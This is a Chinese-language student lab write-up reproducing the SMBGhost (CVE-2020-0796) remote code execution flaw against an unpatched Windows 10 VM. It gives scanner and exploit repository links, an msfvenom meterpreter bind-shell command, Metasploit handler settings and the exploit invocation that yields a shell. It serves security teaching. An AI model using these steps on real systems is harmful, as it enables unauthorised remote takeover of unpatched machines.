本文由东塔网络安全学院-10期班学员- **柚子好吃23** 投稿。

## 一、CVE-2020-0796简介

### 0x01 漏洞简介

CVE-2020-0796是由于SMBv3协议在处理恶意的压缩数据包时出错所造成的；在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。它可让远程且未经身份验证的攻击者在目标系统上执行任意代码，该漏洞类似于永恒之蓝。

漏洞危害等级：高

### 0x02 影响版本

Windows 10 Version 1903 for 32-bit Systems

Windows 10 Version 1903 for x64-based Systems

Windows 10 Version 1903 for ARM64-based Systems

Windows Server, Version 1903 (Server Core installation)

Windows 10 Version 1909 for 32-bit Systems

Windows 10 Version 1909 for x64-based Systems

Windows 10 Version 1909 for ARM64-based Systems

Windows Server, Version 1909 (Server Core installation)

## 二、实验环境

靶机：存在漏洞的win10虚拟机环境,系统镜像：

ed2k://|file|cn_windows_10_consumer_editions_version_1903_x64_dvd_8f05241d.iso|4905476096|F28FDC23DA34D55BA466BFD6E91DD311|/

ip地址：192.168.117.150

安装镜像后的注意事项：

· 将windows10的防火墙关掉，使能互相ping通

· 将window10的自动更新关掉，避免漏洞被打补丁

检测工具：

https://github.com/dickens88/cve-2020-0796-scanner

getshell代码：

https://github.com/chompie1337/SMBGhost_RCE_PoC

攻击机：kali

ip地址：192.168.117.132

## 三、复现过程

1、先用检测代码对目标主机进行扫描，发现存在漏洞

python3 cve-2020-0796-scanner.py -t 192.168.117.150

![](https://image.3001.net/images/20210108/1610104826_5ff83ffa95c537e1ec3ce.jpg!small)

2.使用msfvenom命令生成shellcode代码

msfvenom -p windows/x64/meterpreter/bind_tcp lport=3333 -f py -o shellcode.txt

![](https://image.3001.net/images/20210108/1610104834_5ff84002956fa3ce9ec2a.jpg!small)

将生成的shellcode.txt中的代码替换getshell代码中exploit.py中的USER_PAYLOAD部分

3.开启kali中的msf使用handler模块开启监听

msfconsoleuse exploit/multi/handlerset payload
windows/x64/meterpreter/bind_tcpset rhost 192.168.117.150set lport 3333run

![](https://image.3001.net/images/20210108/1610104842_5ff8400a89dd822b9087f.jpg!small)

![](https://image.3001.net/images/20210108/1610104850_5ff8401257c69822fa732.jpg!small)

4.运行修改好的漏洞利用代码：

python3 exploit.py -ip 192.168.117.150

![](https://image.3001.net/images/20210108/1610104857_5ff84019467dd5e7fbd8d.jpg!small)

5.发现在msf控制台成功获得反弹shell

![](https://image.3001.net/images/20210108/1610104872_5ff8402862965be6b78d9.jpg!small)

![](https://image.3001.net/images/20210108/1610104882_5ff8403287de23a18533e.jpg!small)

6.发现有乱码，使用chcp 65001显示正常

![](https://image.3001.net/images/20210108/1610104985_5ff84099c03d9ebba537c.jpg!small)

至此复现完成

## 四、发生的错误

· 修改后的源码有些错误需要改

![](https://image.3001.net/images/20210108/1610104993_5ff840a1cd0ea060fc86b.jpg!small)

  

